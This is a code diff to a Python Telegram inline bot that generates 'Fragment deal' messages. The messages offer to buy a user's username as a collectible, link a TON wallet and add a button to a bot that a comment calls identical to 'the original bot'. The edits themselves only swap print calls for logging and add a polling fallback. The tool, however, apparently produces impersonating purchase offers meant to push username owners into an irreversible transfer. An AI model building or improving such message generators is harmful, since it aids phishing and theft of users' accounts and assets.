@@ -18,7 +18,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-print(f"🤖 Inline Fragment Deal Generator v4.2")
+print(f"🤖 Inline Fragment Deal Generator v4.3")
 print(f"🔑 Token: ✅")
 print(f"🌐 Port: {PORT}")
 print(f"🔗 Webhook: {WEBHOOK_URL}")
@@ -81,7 +81,7 @@ Important:
                 offset=offer_start,
                 length=len(offer_text)
             ))
-            print(f"✅ Offer Amount: position {offer_start}, length {len(offer_text)}")
+            logger.info(f"✅ Offer Amount: position {offer_start}, length {len(offer_text)}")
         
         # 2. Commission en gras
         commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
@@ -92,7 +92,7 @@ Important:
                 offset=commission_start,
                 length=len(commission_text)
             ))
-            print(f"✅ Commission: position {commission_start}, length {len(commission_text)}")
+            logger.info(f"✅ Commission: position {commission_start}, length {len(commission_text)}")
         
         # 3. Premier point Important en gras
         important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
@@ -103,7 +103,7 @@ Important:
                 offset=important_start1,
                 length=len(important_text1)
             ))
-            print(f"✅ Important 1: position {important_start1}, length {len(important_text1)}")
+            logger.info(f"✅ Important 1: position {important_start1}, length {len(important_text1)}")
         
         # 4. Deuxième point Important en gras
         important_text2 = "• If you choose not to proceed, simply ignore this message."
@@ -114,17 +114,17 @@ Important:
                 offset=important_start2,
                 length=len(important_text2)
             ))
-            print(f"✅ Important 2: position {important_start2}, length {len(important_text2)}")
+            logger.info(f"✅ Important 2: position {important_start2}, length {len(important_text2)}")
         
         # 5. Wallet cliquable
         wallet_start = fragment_message.find(wallet_address)
         if wallet_start != -1:
             # Vérification debug
             actual_wallet_text = fragment_message[wallet_start:wallet_start + len(wallet_address)]
-            print(f"🔍 Wallet found at position {wallet_start}")
-            print(f"🔍 Expected wallet: '{wallet_address}'")
-            print(f"🔍 Actual wallet text: '{actual_wallet_text}'")
-            print(f"🔍 Match: {actual_wallet_text == wallet_address}")
+            logger.info(f"🔍 Wallet found at position {wallet_start}")
+            logger.info(f"🔍 Expected wallet: '{wallet_address}'")
+            logger.info(f"🔍 Actual wallet text: '{actual_wallet_text}'")
+            logger.info(f"🔍 Match: {actual_wallet_text == wallet_address}")
             
             entities.append(MessageEntity(
                 type=MessageEntity.TEXT_LINK,
@@ -132,9 +132,9 @@ Important:
                 length=len(wallet_address),
                 url=f"https://tonviewer.com/{wallet_address}"
             ))
-            print(f"✅ Wallet link: position {wallet_start}, length {len(wallet_address)}")
+            logger.info(f"✅ Wallet link: position {wallet_start}, length {len(wallet_address)}")
         else:
-            print("❌ Wallet address not found in message!")
+            logger.warning("❌ Wallet address not found in message!")
         
         # URL du bouton - identique au bot original
         button_url = f"https://t.me/BidRequestApp_bot/?startapp={username.lower()}-{price:g}"
@@ -250,18 +250,18 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         except Exception as fallback_error:
             logger.error(f"❌ Erreur fallback: {fallback_error}")
 
+async def webhook_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Gestionnaire webhook simple pour Render"""
+    pass
+
 def main():
     """Fonction principale"""
     try:
         logger.info("🚀 Démarrage du bot inline...")
         
-        # Création de l'application avec gestion d'erreur explicite
-        try:
-            application = Application.builder().token(BOT_TOKEN).build()
-            logger.info("✅ Application créée avec succès")
-        except Exception as e:
-            logger.error(f"❌ Erreur création application: {e}")
-            raise
+        # Création de l'application
+        application = Application.builder().token(BOT_TOKEN).build()
+        logger.info("✅ Application créée avec succès")
         
         # Ajout du gestionnaire inline
         application.add_handler(InlineQueryHandler(inline_query_handler))
@@ -278,14 +278,24 @@ def main():
             logger.info(f"📡 Webhook URL: {webhook_url}")
             logger.info(f"🚪 Port: {PORT}")
             
-            # Démarrage webhook
-            application.run_webhook(
-                listen="0.0.0.0",
-                port=PORT,
-                url_path=webhook_path,
-                webhook_url=webhook_url,
-                drop_pending_updates=True
-            )
+            # Alternative: Mode webhook avec configurateur manuel
+            try:
+                # Configuration webhook
+                application.run_webhook(
+                    listen="0.0.0.0",
+                    port=PORT,
+                    url_path=webhook_path,
+                    webhook_url=webhook_url,
+                    drop_pending_updates=True
+                )
+            except Exception as webhook_error:
+                logger.error(f"❌ Erreur webhook: {webhook_error}")
+                logger.info("🔄 Fallback vers polling...")
+                # Fallback vers polling si webhook échoue
+                application.run_polling(
+                    drop_pending_updates=True,
+                    allowed_updates=["inline_query"]
+                )
         else:
             logger.info("🔄 Mode POLLING détecté (local)")
             # Mode polling pour test local
